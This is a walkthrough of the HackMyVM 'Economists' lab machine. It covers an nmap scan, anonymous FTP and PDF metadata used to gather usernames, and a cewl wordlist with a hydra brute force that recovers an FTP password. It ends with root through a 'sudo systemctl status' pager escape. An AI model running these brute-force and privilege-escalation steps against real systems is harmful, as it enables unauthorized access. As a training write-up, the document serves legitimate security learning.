---
layout: post
title: "HackMyVM: Economists"
---

A machine requiring attention to the small details and a fair amount of recon, but easy if you know what you're doing. Also a beginner-friendly box, but took me a while playing blind.

### Recon

**nmap**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-22 19:57 EST  
Nmap scan report for elite-economists.hmv (192.168.56.109)  
Host is up (0.00021s latency).  
Not shown: 997 closed ports  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf  
| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf  
| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf  
| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf  
| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf  
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.56.1  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 1  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Home - Elite Economists  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

A 22-80 situation, with 21 mixed in! Since FTP's here, let's download these files anonymously.

**ftp**

Looking at these files. there's not much interesting information in the contents of the PDFs themselves. Mostly just infographics for a financial company's website. What is worth exploring is the metadata of these files. Specifically, who made these things? I do wonder...

```
thehated@TRYHARDER:/dev/shm$ exiftool *.pdf | grep Author  
Author                          : joseph  
Author                          : richard  
Author                          : crystal  
Author                          : catherine  
Author                          : catherine
```

**cewl**

Now we know. These can be potential usernames in a brute force attack, so we'll write these down. Now for passwords. My initial thought would be to run an attack on the FTP service with these names, but I'd only do that in a last resort since there are multiple. Instead, what we can do is curate our list of words down to a likely list of passes. CeWL can provide us assistance in exactly that. Running this command, we'll get that list right from the website hosted on the box:
```
cewl http://192.168.56.109 > passes.txt
```

### User

Replace the IP with whatever yours is. This collects keywords from the website that could be useful in password-related attacks, like the barrage we're hitting the server with soon. Let's try Joseph first, shall we? Employing Hydra? Affirmative.
```
hydra -l joseph -P passes.txt ftp://192.168.56.109
```

It doesn't take long at all for hydra to come back with a successful user:pass combination.
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-22 19:46:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 462 login tries (l:1/p:462), ~29 tries per task
[DATA] attacking ftp://192.168.56.109:21/
[STATUS] 294.00 tries/min, 294 tries in 00:01h, 168 to do in 00:01h, 16 active
[21][ftp] host: 192.168.56.109   login: joseph   password: wealthiest
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-22 19:47:40
```

Alright, now let's get into the box as if it was MIT! May SSH be with us.
```
joseph@elite-economists:~$
```

### Root

What do we always do first? `sudo -l`. Something comes up, and it offers a direct path to root, as we'll soon learn.
```
Matching Defaults entries for joseph on elite-economists:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User joseph may run the following commands on elite-economists:  
   (ALL) NOPASSWD: /usr/bin/systemctl status
```

Now, why is this dangerous? `systemctl` employs a pager to scroll through the many logs it displays to the user, the default one being `less`. It not only lets you page through files, but escape it entirely and execute shell commands. By running `sudo systemctl status` and typing in `!sh`, a root terminal awaits us upon hitting that enter key. Another box down, but there's always more to tackle!
```
root@elite-economists:~#
```